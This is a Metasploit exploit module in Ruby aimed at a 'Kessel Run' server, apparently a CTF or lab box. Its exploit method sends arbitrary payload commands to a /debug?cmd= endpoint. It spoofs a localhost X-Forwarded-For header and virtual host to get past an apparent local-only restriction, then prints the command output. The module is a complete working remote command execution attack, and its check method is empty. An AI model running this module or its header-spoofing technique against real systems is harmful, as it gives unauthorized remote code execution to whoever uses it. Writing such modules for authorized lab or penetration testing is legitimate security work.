##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::HttpClient
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Kessel Run server execution',
          'Description' => %q{
            Hack Kessel Run box
          },
          'License' => MSF_LICENSE,
          'Author' => [
          ],
          'References' => [
          ],
          'Platform' => [ 'unix', 'linux'],
          'Privileged' => false,
          'Arch' => ARCH_CMD,
          'Targets'        =>
          [
            ['Automatic', {}]
          ],
          'DisclosureDate' => '2020-11-14', # 0day detected by wpvdb
          'DefaultTarget' => 0
        )
      )
      register_options([])
    end
  
    def check
    end
  
    def exploit
      datastore['VHOST'] = "localhost.localdomain"
      command = Rex::Text.uri_encode(payload.raw)
      res = send_request_raw({
        'method' => 'GET',
        'uri'    => normalize_uri("/debug?cmd=#{command}"),
        'headers' => {
          "X-Forwarded-For": "127.0.0.2:9999",
        },
        'encode_params' => true,
        'vars_get'      => {
          "cmd": "ls"
        }
      })
  
      fail_with(Failure::Unreachable, "#{peer} - Could not connect") unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}") unless res.code == 200
      # Read command output if cmd/unix/generic payload was used
      if datastore['CMD']
        unless res and res.code == 200
          fail_with(Failure::Unknown, "#{peer} - Unexpected response, probably the exploit failed")
        end
        print_line(res.body)
      end
    end
  end
  